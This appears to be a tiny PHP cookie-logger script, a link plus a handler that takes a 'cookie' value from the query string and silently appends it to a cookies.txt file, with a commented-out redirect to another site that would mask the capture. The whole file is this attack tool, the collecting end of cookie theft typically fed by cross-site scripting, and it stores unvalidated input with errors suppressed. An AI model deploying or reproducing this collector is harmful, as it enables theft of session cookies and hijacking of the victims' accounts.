

<a href="cookie.php?cookie=Islam">Click Here</a>
<?php

 $cookie = $_GET['cookie'];

 $info = "$cookie\n";
 $fh = @fopen("cookies.txt", "a");
 @fwrite($fh, $info);


 // Return to original site
 //header("Location: http://www.yahoo.com");

?>